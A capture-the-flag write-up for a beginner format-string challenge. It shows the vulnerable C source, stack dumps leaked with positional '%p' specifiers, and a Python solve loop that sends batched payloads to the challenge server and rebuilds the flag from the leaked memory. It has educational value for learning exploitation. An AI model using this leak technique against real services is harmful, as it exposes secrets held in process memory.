# Echo Chamber

- Category: pwn
- Difficulty: Beginner
- Author: hoover

"Welcome to the echo chamber. Say something, it says it back, sixteen times."

A format string bug — but one that needs no `%n` write, no GOT overwrite and no pointer chasing, because the flag is already sitting in the stack frame `printf` walks for its arguments.

### Solution:

##### 1. Read the handout source

```c
int main(void) {
    char flag[128], input[128];

    setbuf(stdout, NULL);
    fgets(flag, sizeof(flag), fopen("/flag.txt", "r"));

    for (int i = 0; i < 16; i++) {
        printf("> ");
        if (!fgets(input, sizeof(input), stdin))
            break;
        printf(input);          // <-- format string, fully attacker-controlled
    }
}
```

`printf(input)` with no format string is the bug. The detail that decides the whole exploit is one line above it: **`flag` and `input` are both locals of `main`**, so the flag bytes live in the same frame `printf` is about to treat as its variadic argument area. There's nothing to hijack — just read the stack back out.

The binary is non-PIE with no canary, which would matter for a ret2win, but none of that is needed here.

##### 2. Dump the stack

On x86-64 SysV, `printf`'s first vararg slots come from registers: `rdi` holds the format string itself, so `%1$p`–`%5$p` read `rsi`, `rdx`, `rcx`, `r8`, `r9`. Only `%6$p` onward walk actual stack memory — which is where the frame, and therefore the flag, lives.

Sweeping positional specifiers against a local run (fake flag `NNS{local_fake_flag_for_testing_1234}`):

```
> 19:0x7f000a702434|20:(nil)|21:0x7f880fb78000|22:0x61636f6c7b534e4e|23:0x665f656b61665f6c|24:0x5f726f665f67616c
> 25:0x5f676e6974736574|26:0xa7d34333231|27:(nil)|28:(nil)|29:(nil)|30:(nil)
```

Slot 22 is the hit — `0x61636f6c7b534e4e` byte-reversed is `NNS{loca`, and 23–26 carry the rest until the buffer runs into zeros. Slots 6–18 come back as the ASCII of our own payload echoing back (`input` is in the same frame too, a few slots below).

##### 3. Reassemble the qwords

Two quirks make "just concatenate the hex" wrong:

- glibc prints a zero pointer as `(nil)`, not `0x0`.
- `%p` strips leading zeros, so a slot like `0xa7d34333231` is really the 8 bytes `31 32 33 34 7d 0a 00 00` — text-concatenating would silently drop the high NULs and desynchronise everything after it.

So each slot has to be parsed as an integer and re-expanded to a fixed 8 bytes little-endian:

```python
blob = b"".join(leaked.get(i, 0).to_bytes(8, 'little') for i in sorted(leaked))
flag = re.search(rb'NNS\{[ -~]*?\}', blob)
```

`fgets` also caps input at 127 chars, which is too tight for one specifier per slot across the whole range, so the sweep goes in chunks of 13 (`%N$p.` is 6 chars → 78 chars per line). Three lines covers slots 6–45, well inside the 16-`printf` budget.

Sweeping the whole range instead of hardcoding `%22$p` costs nothing and means the script survives a different frame layout — which is also why it worked first try against the remote instance.

##### 4. Exploit

```python
for lo in range(6, 46, 13):
    slots = list(range(lo, min(lo + 13, 46)))
    payload = "".join(f"%{i}$p." for i in slots)
    io.recvuntil(b'> ')
    io.sendline(payload.encode())
    for i, tok in zip(slots, io.recvline().decode().strip().split('.')):
        tok = tok.strip()
        if tok.startswith('0x'):
            leaked[i] = int(tok, 16)
        elif tok == '(nil)':
            leaked[i] = 0
```

```
$ ./solve.py echo-chamber-e021f92f304d.chall.nnsc.tf:1337
NNS{i_1ove_how_pRiNtf_74K35_tHe_s7acK_45_4R6uM3n7s}
```

Full script: [solve.py](solve.py)

**Flag:** `NNS{i_1ove_how_pRiNtf_74K35_tHe_s7acK_45_4R6uM3n7s}`

### Takeaways

- When a secret is a **local in the same function** as the format string bug, the exploit is just `%p` — no `%n`, no arbitrary write, no leak-then-deref. Check the source (or the frame layout) for that before reaching for anything heavier; it collapses a "format string" challenge into a stack dump.
- Never rebuild leaked memory by concatenating `%p` output as text. `%p` drops leading zeros and renders NULL as `(nil)`, so the only safe path is parse-to-int then re-expand to fixed-width little-endian bytes.
- `fgets`-capped input is a real budget constraint on format-string sweeps. Batching many `%N$p` per line (rather than one slot per round) is what keeps a wide sweep inside a limited number of `printf` calls.
